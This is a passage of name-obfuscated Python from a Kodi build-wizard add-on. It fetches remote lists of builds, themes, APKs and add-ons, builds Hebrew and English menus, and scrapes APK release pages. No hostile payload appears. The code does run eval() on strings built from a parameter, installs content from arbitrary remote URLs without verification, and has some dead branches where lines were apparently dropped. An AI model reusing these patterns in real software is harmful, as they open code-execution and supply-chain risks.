	if USERNAME =='':#line:2176
		ADDON .openSettings ()#line:2177
		sys .exit ()#line:2178
	if PASSWORD =='':#line:2179
		ADDON .openSettings ()#line:2180
	OOOOO000OOO0OO0O0 =u_list (SPEEDFILE )#line:2181
	(OOOOO000OOO0OO0O0 )#line:2182
	OO00000O0O0000OO0 =(wiz .workingURL (OOOOO000OOO0OO0O0 ))#line:2183
	(OO00000O0O0000OO0 )#line:2184
	OO00000O0O0000OO0 =wiz .workingURL (SPEEDFILE )#line:2185
	if not OO00000O0O0000OO0 ==True :#line:2186
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2187
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2188
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2189
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2190
		addFile ('%s'%OO00000O0O0000OO0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2191
	else :#line:2192
		O000O00OO00O0O00O ,OOOOO000O0O0O0000 ,OOOOO0OO00OOO00OO ,OOO0OOOOO00OOO0O0 ,O0O0O00O00OOOOO00 ,OO00000O0O0OOOOOO ,O000000O00OO0O0O0 =wiz .buildCount ()#line:2193
		O0000OOO00O0000O0 =False ;O0O00O0OO000O0OO0 =[]#line:2194
		if THIRDPARTY =='true':#line:2195
			if not THIRD1NAME ==''and not THIRD1URL =='':O0000OOO00O0000O0 =True ;O0O00O0OO000O0OO0 .append ('1')#line:2196
			if not THIRD2NAME ==''and not THIRD2URL =='':O0000OOO00O0000O0 =True ;O0O00O0OO000O0OO0 .append ('2')#line:2197
			if not THIRD3NAME ==''and not THIRD3URL =='':O0000OOO00O0000O0 =True ;O0O00O0OO000O0OO0 .append ('3')#line:2198
		OO0O000OOOOO0OO00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2199
		OO0OOO0OOO0OO0000 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O000OOOOO0OO00 )#line:2200
		if O000O00OO00O0O00O ==1 and O0000OOO00O0000O0 ==False :#line:2201
			for OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ,O000OOOO0000O0OOO ,OOOO00O0O000OO00O ,OO0000OO0OOO0OO00 ,O00O000OOO0OOOOOO ,OO0OOOO000O00O000 ,O0OOOOOOO0000000O ,OO00000O0O0OOO0OO ,O0000OO0O00OO0OOO in OO0OOO0OOO0OO0000 :#line:2202
				if not SHOWADULT =='true'and OO00000O0O0OOO0OO .lower ()=='yes':continue #line:2203
				if not DEVELOPER =='true'and wiz .strTest (OOOO00OO00OOO0OOO ):continue #line:2204
				viewBuild (OO0OOO0OOO0OO0000 [0 ][0 ])#line:2205
				return #line:2206
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2209
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2210
		if O0000OOO00O0000O0 ==True :#line:2211
			for OO00OOO0OOOOO0OOO in O0O00O0OO000O0OO0 :#line:2212
				OOOO00OO00OOO0OOO =eval ('THIRD%sNAME'%OO00OOO0OOOOO0OOO )#line:2213
		if len (OO0OOO0OOO0OO0000 )>=1 :#line:2215
			if SEPERATE =='true':#line:2216
				for OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ,O000OOOO0000O0OOO ,OOOO00O0O000OO00O ,OO0000OO0OOO0OO00 ,O00O000OOO0OOOOOO ,OO0OOOO000O00O000 ,O0OOOOOOO0000000O ,OO00000O0O0OOO0OO ,O0000OO0O00OO0OOO in OO0OOO0OOO0OO0000 :#line:2217
					if not SHOWADULT =='true'and OO00000O0O0OOO0OO .lower ()=='yes':continue #line:2218
					if not DEVELOPER =='true'and wiz .strTest (OOOO00OO00OOO0OOO ):continue #line:2219
					OO000000OOO000OO0 =createMenu ('install','',OOOO00OO00OOO0OOO )#line:2220
					addDir ('[%s] %s (v%s)'%(float (OO0000OO0OOO0OO00 ),OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ),'viewbuild',OOOO00OO00OOO0OOO ,description =O0000OO0O00OO0OOO ,fanart =O0OOOOOOO0000000O ,icon =OO0OOOO000O00O000 ,menu =OO000000OOO000OO0 ,themeit =THEME2 )#line:2221
			else :#line:2222
				if OOO0OOOOO00OOO0O0 >0 :#line:2223
					OOO000OO000O000O0 ='+'if SHOW17 =='false'else '-'#line:2224
					if SHOW17 =='true':#line:2226
						for OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ,O000OOOO0000O0OOO ,OOOO00O0O000OO00O ,OO0000OO0OOO0OO00 ,O00O000OOO0OOOOOO ,OO0OOOO000O00O000 ,O0OOOOOOO0000000O ,OO00000O0O0OOO0OO ,O0000OO0O00OO0OOO in OO0OOO0OOO0OO0000 :#line:2228
							if not SHOWADULT =='true'and OO00000O0O0OOO0OO .lower ()=='yes':continue #line:2229
							if not DEVELOPER =='true'and wiz .strTest (OOOO00OO00OOO0OOO ):continue #line:2230
							O00O00O00O0000O00 =int (float (OO0000OO0OOO0OO00 ))#line:2231
							if O00O00O00O0000O00 ==17 :#line:2232
								OO000000OOO000OO0 =createMenu ('install','',OOOO00OO00OOO0OOO )#line:2233
								addDir ('[%s] %s (v%s)'%(float (OO0000OO0OOO0OO00 ),OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ),'viewbuild',OOOO00OO00OOO0OOO ,description =O0000OO0O00OO0OOO ,fanart =O0OOOOOOO0000000O ,icon =OO0OOOO000O00O000 ,menu =OO000000OOO000OO0 ,themeit =THEME2 )#line:2234
				if O0O0O00O00OOOOO00 >0 :#line:2235
					OOO000OO000O000O0 ='+'if SHOW18 =='false'else '-'#line:2236
					if SHOW18 =='true':#line:2238
						for OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ,O000OOOO0000O0OOO ,OOOO00O0O000OO00O ,OO0000OO0OOO0OO00 ,O00O000OOO0OOOOOO ,OO0OOOO000O00O000 ,O0OOOOOOO0000000O ,OO00000O0O0OOO0OO ,O0000OO0O00OO0OOO in OO0OOO0OOO0OO0000 :#line:2240
							if not SHOWADULT =='true'and OO00000O0O0OOO0OO .lower ()=='yes':continue #line:2241
							if not DEVELOPER =='true'and wiz .strTest (OOOO00OO00OOO0OOO ):continue #line:2242
							O00O00O00O0000O00 =int (float (OO0000OO0OOO0OO00 ))#line:2243
							if O00O00O00O0000O00 ==18 :#line:2244
								OO000000OOO000OO0 =createMenu ('install','',OOOO00OO00OOO0OOO )#line:2245
								addDir ('[%s] %s (v%s)'%(float (OO0000OO0OOO0OO00 ),OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ),'viewbuild',OOOO00OO00OOO0OOO ,description =O0000OO0O00OO0OOO ,fanart =O0OOOOOOO0000000O ,icon =OO0OOOO000O00O000 ,menu =OO000000OOO000OO0 ,themeit =THEME2 )#line:2246
				if OOOOO0OO00OOO00OO >0 :#line:2247
					OOO000OO000O000O0 ='+'if SHOW16 =='false'else '-'#line:2248
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOO000OO000O000O0 ,OOOOO0OO00OOO00OO ),'togglesetting','show16',themeit =THEME3 )#line:2249
					if SHOW16 =='true':#line:2250
						for OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ,O000OOOO0000O0OOO ,OOOO00O0O000OO00O ,OO0000OO0OOO0OO00 ,O00O000OOO0OOOOOO ,OO0OOOO000O00O000 ,O0OOOOOOO0000000O ,OO00000O0O0OOO0OO ,O0000OO0O00OO0OOO in OO0OOO0OOO0OO0000 :#line:2251
							if not SHOWADULT =='true'and OO00000O0O0OOO0OO .lower ()=='yes':continue #line:2252
							if not DEVELOPER =='true'and wiz .strTest (OOOO00OO00OOO0OOO ):continue #line:2253
							O00O00O00O0000O00 =int (float (OO0000OO0OOO0OO00 ))#line:2254
							if O00O00O00O0000O00 ==16 :#line:2255
								OO000000OOO000OO0 =createMenu ('install','',OOOO00OO00OOO0OOO )#line:2256
								addDir ('[%s] %s (v%s)'%(float (OO0000OO0OOO0OO00 ),OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ),'viewbuild',OOOO00OO00OOO0OOO ,description =O0000OO0O00OO0OOO ,fanart =O0OOOOOOO0000000O ,icon =OO0OOOO000O00O000 ,menu =OO000000OOO000OO0 ,themeit =THEME2 )#line:2257
				if OOOOO000O0O0O0000 >0 :#line:2258
					OOO000OO000O000O0 ='+'if SHOW15 =='false'else '-'#line:2259
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOO000OO000O000O0 ,OOOOO000O0O0O0000 ),'togglesetting','show15',themeit =THEME3 )#line:2260
					if SHOW15 =='true':#line:2261
						for OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ,O000OOOO0000O0OOO ,OOOO00O0O000OO00O ,OO0000OO0OOO0OO00 ,O00O000OOO0OOOOOO ,OO0OOOO000O00O000 ,O0OOOOOOO0000000O ,OO00000O0O0OOO0OO ,O0000OO0O00OO0OOO in OO0OOO0OOO0OO0000 :#line:2262
							if not SHOWADULT =='true'and OO00000O0O0OOO0OO .lower ()=='yes':continue #line:2263
							if not DEVELOPER =='true'and wiz .strTest (OOOO00OO00OOO0OOO ):continue #line:2264
							O00O00O00O0000O00 =int (float (OO0000OO0OOO0OO00 ))#line:2265
							if O00O00O00O0000O00 <=15 :#line:2266
								OO000000OOO000OO0 =createMenu ('install','',OOOO00OO00OOO0OOO )#line:2267
								addDir ('[%s] %s (v%s)'%(float (OO0000OO0OOO0OO00 ),OOOO00OO00OOO0OOO ,OO0OOOO00OOO0O0O0 ),'viewbuild',OOOO00OO00OOO0OOO ,description =O0000OO0O00OO0OOO ,fanart =O0OOOOOOO0000000O ,icon =OO0OOOO000O00O000 ,menu =OO000000OOO000OO0 ,themeit =THEME2 )#line:2268
		elif O000000O00OO0O0O0 >0 :#line:2269
			if OO00000O0O0OOOOOO >0 :#line:2270
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2271
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2272
			else :#line:2273
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2274
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2275
	setView ('files','viewType')#line:2276
def viewBuild (OO0OO00O0OOOO0000 ):#line:2278
	OOOO00O0OO0OOOO0O =wiz .workingURL (SPEEDFILE )#line:2279
	if not OOOO00O0OO0OOOO0O ==True :#line:2280
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2281
		addFile ('%s'%OOOO00O0OO0OOOO0O ,'',themeit =THEME3 )#line:2282
		return #line:2283
	if wiz .checkBuild (OO0OO00O0OOOO0000 ,'version')==False :#line:2284
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2285
		addFile ('%s was not found in the builds list.'%OO0OO00O0OOOO0000 ,'',themeit =THEME3 )#line:2286
		return #line:2287
	O00000O0000O000OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2288
	O0000O00OOOO0OO0O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OO00O0OOOO0000 ).findall (O00000O0000O000OO )#line:2289
	for OOOO0O00OOOO0OOOO ,OOO00OO0OO0OOO000 ,OOO0O00O000O0O000 ,O000O0OO000OO0OO0 ,OO0OO0000OO0O00OO ,OOO0O00O0O00OO000 ,O00O00O000O0O0O00 ,OO000OOO0O0000OOO ,OOO00OOOOO0O0O0O0 ,OO0OOO0O00O0O00OO in O0000O00OOOO0OO0O :#line:2290
		OOO0O00O0O00OO000 =OOO0O00O0O00OO000 if wiz .workingURL (OOO0O00O0O00OO000 )else ICON #line:2291
		O00O00O000O0O0O00 =O00O00O000O0O0O00 if wiz .workingURL (O00O00O000O0O0O00 )else FANART #line:2292
		OO0O0O0O000O0O0O0 ='%s (v%s)'%(OO0OO00O0OOOO0000 ,OOOO0O00OOOO0OOOO )#line:2293
		if BUILDNAME ==OO0OO00O0OOOO0000 and OOOO0O00OOOO0OOOO >BUILDVERSION :#line:2294
			OO0O0O0O000O0O0O0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0O0O0O000O0O0O0 ,BUILDVERSION )#line:2295
		O0O000O00000O0OO0 =int (float (KODIV ));O0OOOOO000O0000OO =int (float (O000O0OO000OO0OO0 ))#line:2304
		if not O0O000O00000O0OO0 ==O0OOOOO000O0000OO :#line:2305
			if O0O000O00000O0OO0 ==16 and O0OOOOO000O0000OO <=15 :O000O0O0O0O0O00OO =False #line:2306
			else :O000O0O0O0O0O00OO =True #line:2307
		else :O000O0O0O0O0O00OO =False #line:2308
		addFile ('התקנה','install',OO0OO00O0OOOO0000 ,'fresh',description =OO0OOO0O00O0O00OO ,fanart =O00O00O000O0O0O00 ,icon =OOO0O00O0O00OO000 ,themeit =THEME1 )#line:2312
		if not OO0OO0000OO0O00OO =='http://':#line:2315
			if wiz .workingURL (OO0OO0000OO0O00OO )==True :#line:2316
				addFile (wiz .sep ('THEMES'),'',fanart =O00O00O000O0O0O00 ,icon =OOO0O00O0O00OO000 ,themeit =THEME3 )#line:2317
				O00000O0000O000OO =wiz .openURL (OO0OO0000OO0O00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2318
				O0000O00OOOO0OO0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00000O0000O000OO )#line:2319
				for O00O0O0000O0O00O0 ,OOO0O0O0OOO0O00O0 ,O0O0O00OOO0OO0O00 ,O0OO00O00OOO0O0OO ,O000OO00OOOO000O0 ,OO0OOO0O00O0O00OO in O0000O00OOOO0OO0O :#line:2320
					if not SHOWADULT =='true'and O000OO00OOOO000O0 .lower ()=='yes':continue #line:2321
					O0O0O00OOO0OO0O00 =O0O0O00OOO0OO0O00 if O0O0O00OOO0OO0O00 =='http://'else OOO0O00O0O00OO000 #line:2322
					O0OO00O00OOO0O0OO =O0OO00O00OOO0O0OO if O0OO00O00OOO0O0OO =='http://'else O00O00O000O0O0O00 #line:2323
					addFile (O00O0O0000O0O00O0 if not O00O0O0000O0O00O0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00O0O0000O0O00O0 ,'theme',OO0OO00O0OOOO0000 ,O00O0O0000O0O00O0 ,description =OO0OOO0O00O0O00OO ,fanart =O0OO00O00OOO0O0OO ,icon =O0O0O00OOO0OO0O00 ,themeit =THEME3 )#line:2324
	setView ('files','viewType')#line:2325
def viewThirdList (OO0OOO00000OO0000 ):#line:2327
	OO0O00OO00O0OO0OO =eval ('THIRD%sNAME'%OO0OOO00000OO0000 )#line:2328
	O0O000OOOOO00OOO0 =eval ('THIRD%sURL'%OO0OOO00000OO0000 )#line:2329
	O000O0000OO00000O =wiz .workingURL (O0O000OOOOO00OOO0 )#line:2330
	if not O000O0000OO00000O ==True :#line:2331
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2332
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2333
	else :#line:2334
		O0000O00O0OOOO0OO ,OOO0000O00OOOO0O0 =wiz .thirdParty (O0O000OOOOO00OOO0 )#line:2335
		addFile ("[B]%s[/B]"%OO0O00OO00O0OO0OO ,'',themeit =THEME3 )#line:2336
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2337
		if O0000O00O0OOOO0OO :#line:2338
			for OO0O00OO00O0OO0OO ,O0000000OO0OOO000 ,O0O000OOOOO00OOO0 ,O00OO0OO0O0O0OOO0 ,OO0OOO00000OO000O ,O0O0O0OO000O00OOO ,O00O0O00O00OOOOOO ,OO0000OOO00000OO0 in OOO0000O00OOOO0O0 :#line:2339
				if not SHOWADULT =='true'and O00O0O00O00OOOOOO .lower ()=='yes':continue #line:2340
				addFile ("[%s] %s v%s"%(O00OO0OO0O0O0OOO0 ,OO0O00OO00O0OO0OO ,O0000000OO0OOO000 ),'installthird',OO0O00OO00O0OO0OO ,O0O000OOOOO00OOO0 ,icon =OO0OOO00000OO000O ,fanart =O0O0O0OO000O00OOO ,description =OO0000OOO00000OO0 ,themeit =THEME2 )#line:2341
		else :#line:2342
			for OO0O00OO00O0OO0OO ,O0O000OOOOO00OOO0 ,OO0OOO00000OO000O ,O0O0O0OO000O00OOO ,OO0000OOO00000OO0 in OOO0000O00OOOO0O0 :#line:2343
				addFile (OO0O00OO00O0OO0OO ,'installthird',OO0O00OO00O0OO0OO ,O0O000OOOOO00OOO0 ,icon =OO0OOO00000OO000O ,fanart =O0O0O0OO000O00OOO ,description =OO0000OOO00000OO0 ,themeit =THEME2 )#line:2344
def editThirdParty (O0O00OO0O000000OO ):#line:2346
	OOOOOO0000O00O0OO =eval ('THIRD%sNAME'%O0O00OO0O000000OO )#line:2347
	O00OO0OOOOO00O0O0 =eval ('THIRD%sURL'%O0O00OO0O000000OO )#line:2348
	OOO0OOO0O00OOOO00 =wiz .getKeyboard (OOOOOO0000O00O0OO ,'Enter the Name of the Wizard')#line:2349
	OOO00OOO0O000OOOO =wiz .getKeyboard (O00OO0OOOOO00O0O0 ,'Enter the URL of the Wizard Text')#line:2350
	wiz .setS ('wizard%sname'%O0O00OO0O000000OO ,OOO0OOO0O00OOOO00 )#line:2352
	wiz .setS ('wizard%surl'%O0O00OO0O000000OO ,OOO00OOO0O000OOOO )#line:2353
def apkScraper (name =""):#line:2355
	if name =='kodi':#line:2356
		OOOO0O0O00O00OO00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2357
		OOOO00O00O0OO00O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2358
		OO0OOOO0O00OO0OO0 =wiz .openURL (OOOO0O0O00O00OO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2359
		OOO00000000O00OO0 =wiz .openURL (OOOO00O00O0OO00O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2360
		OO0000O0OO0OOO000 =0 #line:2361
		OO0O0OO0OOO0O00O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0OOOO0O00OO0OO0 )#line:2362
		O0OO0OO0O000O0O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO00000000O00OO0 )#line:2363
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2365
		OO0O00OO000O0000O =False #line:2366
		for OO00O0O00O00O00O0 ,name ,O0OOO000O00OO0000 ,OOOO0OOOOOOOOO000 in OO0O0OO0OOO0O00O0 :#line:2367
			if OO00O0O00O00O00O0 in ['../','old/']:continue #line:2368
			if not OO00O0O00O00O00O0 .endswith ('.apk'):continue #line:2369
			if not OO00O0O00O00O00O0 .find ('_')==-1 and OO0O00OO000O0000O ==True :continue #line:2370
			try :#line:2371
				OO000O0000O0O00O0 =name .split ('-')#line:2372
				if not OO00O0O00O00O00O0 .find ('_')==-1 :#line:2373
					OO0O00OO000O0000O =True #line:2374
					OO000OOO00000O00O ,O0OOO0O00O0O00000 =OO000O0000O0O00O0 [2 ].split ('_')#line:2375
				else :#line:2376
					OO000OOO00000O00O =OO000O0000O0O00O0 [2 ]#line:2377
					O0OOO0O00O0O00000 =''#line:2378
				OO0OOO000O0OOOO0O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O0000O0O00O0 [0 ].title (),OO000O0000O0O00O0 [1 ],O0OOO0O00O0O00000 .upper (),OO000OOO00000O00O ,COLOR2 ,O0OOO000O00OO0000 .replace (' ',''),COLOR1 ,OOOO0OOOOOOOOO000 )#line:2379
				O0OO0O0O0OO0O0OO0 =urljoin (OOOO0O0O00O00OO00 ,OO00O0O00O00O00O0 )#line:2380
				addFile (OO0OOO000O0OOOO0O ,'apkinstall',"%s v%s%s %s"%(OO000O0000O0O00O0 [0 ].title (),OO000O0000O0O00O0 [1 ],O0OOO0O00O0O00000 .upper (),OO000OOO00000O00O ),O0OO0O0O0OO0O0OO0 )#line:2381
				OO0000O0OO0OOO000 +=1 #line:2382
			except :#line:2383
				wiz .log ("Error on: %s"%name )#line:2384
		for OO00O0O00O00O00O0 ,name ,O0OOO000O00OO0000 ,OOOO0OOOOOOOOO000 in O0OO0OO0O000O0O0O :#line:2386
			if OO00O0O00O00O00O0 in ['../','old/']:continue #line:2387
			if not OO00O0O00O00O00O0 .endswith ('.apk'):continue #line:2388
			if not OO00O0O00O00O00O0 .find ('_')==-1 :continue #line:2389
			try :#line:2390
				OO000O0000O0O00O0 =name .split ('-')#line:2391
				OO0OOO000O0OOOO0O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O0000O0O00O0 [0 ].title (),OO000O0000O0O00O0 [1 ],OO000O0000O0O00O0 [2 ],COLOR2 ,O0OOO000O00OO0000 .replace (' ',''),COLOR1 ,OOOO0OOOOOOOOO000 )#line:2392
				O0OO0O0O0OO0O0OO0 =urljoin (OOOO00O00O0OO00O0 ,OO00O0O00O00O00O0 )#line:2393
				addFile (OO0OOO000O0OOOO0O ,'apkinstall',"%s v%s %s"%(OO000O0000O0O00O0 [0 ].title (),OO000O0000O0O00O0 [1 ],OO000O0000O0O00O0 [2 ]),O0OO0O0O0OO0O0OO0 )#line:2394
				OO0000O0OO0OOO000 +=1 #line:2395
			except :#line:2396
				wiz .log ("Error on: %s"%name )#line:2397
		if OO0000O0OO0OOO000 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2398
	elif name =='spmc':#line:2399
		OOO0000O0O00OO000 ='https://github.com/koying/SPMC/releases'#line:2400
		OO0OOOO0O00OO0OO0 =wiz .openURL (OOO0000O0O00OO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2401
		OO0000O0OO0OOO000 =0 #line:2402
		OO0O0OO0OOO0O00O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0OOOO0O00OO0OO0 )#line:2403
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2405
		for name ,OOOOO0O00O000000O in OO0O0OO0OOO0O00O0 :#line:2407
			OOO0OOO0OOO0000OO =''#line:2408
			O0OO0OO0O000O0O0O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOOO0O00O000000O )#line:2409
			for O000O00OO0O00O000 ,O0O00OO00OOO00000 ,OO00OO00OOO0OO0O0 in O0OO0OO0O000O0O0O :#line:2410
				if OO00OO00OOO0OO0O0 .find ('armeabi')==-1 :continue #line:2411
				if OO00OO00OOO0OO0O0 .find ('launcher')>-1 :continue #line:2412
				OOO0OOO0OOO0000OO =urljoin ('https://github.com',O000O00OO0O00O000 )#line:2413
				break #line:2414
		if OO0000O0OO0OOO000 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2416
def apkMenu (url =None ):#line:2418
	if url ==None :#line:2419
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2422
	if not APKFILE =='http://':#line:2423
		if url ==None :#line:2424
			O0OOOOO00O000OO00 =wiz .workingURL (APKFILE )#line:2425
			OOO0O0O0O0000O00O =uservar .APKFILE #line:2426
		else :#line:2427
			O0OOOOO00O000OO00 =wiz .workingURL (url )#line:2428
			OOO0O0O0O0000O00O =url #line:2429
		if O0OOOOO00O000OO00 ==True :#line:2430
			O000OOO000000OO0O =wiz .openURL (OOO0O0O0O0000O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2431
			O000OOO0OO0000O00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OOO000000OO0O )#line:2432
			if len (O000OOO0OO0000O00 )>0 :#line:2433
				O000O0O0OOO0OOOO0 =0 #line:2434
				for OO0OO0000OOO0OOOO ,OO00OO0O0OO0OOOO0 ,url ,OO00OO0OOOO0OO0O0 ,O00O0O00O0OOOO0OO ,O0OO00O00O0OO00OO ,OOO0OO00OOOO00O00 in O000OOO0OO0000O00 :#line:2435
					if not SHOWADULT =='true'and O0OO00O00O0OO00OO .lower ()=='yes':continue #line:2436
					if OO00OO0O0OO0OOOO0 .lower ()=='yes':#line:2437
						O000O0O0OOO0OOOO0 +=1 #line:2438
						addDir ("[B]%s[/B]"%OO0OO0000OOO0OOOO ,'apk',url ,description =OOO0OO00OOOO00O00 ,icon =OO00OO0OOOO0OO0O0 ,fanart =O00O0O00O0OOOO0OO ,themeit =THEME3 )#line:2439
					else :#line:2440
						O000O0O0OOO0OOOO0 +=1 #line:2441
						addFile (OO0OO0000OOO0OOOO ,'apkinstall',OO0OO0000OOO0OOOO ,url ,description =OOO0OO00OOOO00O00 ,icon =OO00OO0OOOO0OO0O0 ,fanart =O00O0O00O0OOOO0OO ,themeit =THEME2 )#line:2442
					if O000O0O0OOO0OOOO0 <1 :#line:2443
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2444
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2445
		else :#line:2446
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2447
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2448
			addFile ('%s'%O0OOOOO00O000OO00 ,'',themeit =THEME3 )#line:2449
		return #line:2450
	else :wiz .log ("[APK Menu] No APK list added.")#line:2451
	setView ('files','viewType')#line:2452
def addonMenu (url =None ):#line:2454
	if not ADDONFILE =='http://':#line:2455
		if url ==None :#line:2456
			O0OO0O00O0O0O0000 =wiz .workingURL (ADDONFILE )#line:2457
			OOOOOOOO00O000OOO =uservar .ADDONFILE #line:2458
		else :#line:2459
			O0OO0O00O0O0O0000 =wiz .workingURL (url )#line:2460
			OOOOOOOO00O000OOO =url #line:2461
		if O0OO0O00O0O0O0000 ==True :#line:2462
			O0000OO00OOOO00O0 =wiz .openURL (OOOOOOOO00O000OOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2463
			OO0OO0OOO0O0OO0OO =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000OO00OOOO00O0 )#line:2464
			if len (OO0OO0OOO0O0OO0OO )>0 :#line:2465
				O00O00OO00O0OOOOO =0 #line:2466
				for O0OO00OOOO0OO0OOO ,OO0OO00OO0O0O0O0O ,url ,O0OO00OO0O0O0OOOO ,OOO0000O0OOO00000 ,O000000O0O00000O0 ,OO00O0OOOOO000OOO ,O00OO0OO0O0OOOOOO ,O00O0000000O0OO00 ,O00O0OO0000OOO0O0 in OO0OO0OOO0O0OO0OO :#line:2467
					if OO0OO00OO0O0O0O0O .lower ()=='section':#line:2468
						O00O00OO00O0OOOOO +=1 #line:2469
						addDir ("[B]%s[/B]"%O0OO00OOOO0OO0OOO ,'addons',url ,description =O00O0OO0000OOO0O0 ,icon =OO00O0OOOOO000OOO ,fanart =O00OO0OO0O0OOOOOO ,themeit =THEME3 )#line:2470
					else :#line:2471
						if not SHOWADULT =='true'and O00O0000000O0OO00 .lower ()=='yes':continue #line:2472
						try :#line:2473
							O0O00OO0O0OO0O00O =xbmcaddon .Addon (id =OO0OO00OO0O0O0O0O ).getAddonInfo ('path')#line:2474
							if os .path .exists (O0O00OO0O0OO0O00O ):#line:2475
								O0OO00OOOO0OO0OOO ="[COLOR green][Installed][/COLOR] %s"%O0OO00OOOO0OO0OOO #line:2476
						except :#line:2477
							pass #line:2478
						O00O00OO00O0OOOOO +=1 #line:2479
						addFile (O0OO00OOOO0OO0OOO ,'addoninstall',OO0OO00OO0O0O0O0O ,OOOOOOOO00O000OOO ,description =O00O0OO0000OOO0O0 ,icon =OO00O0OOOOO000OOO ,fanart =O00OO0OO0O0OOOOOO ,themeit =THEME2 )#line:2480
					if O00O00OO00O0OOOOO <1 :#line:2481
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2482
			else :#line:2483
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2484
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2485
		else :#line:2486
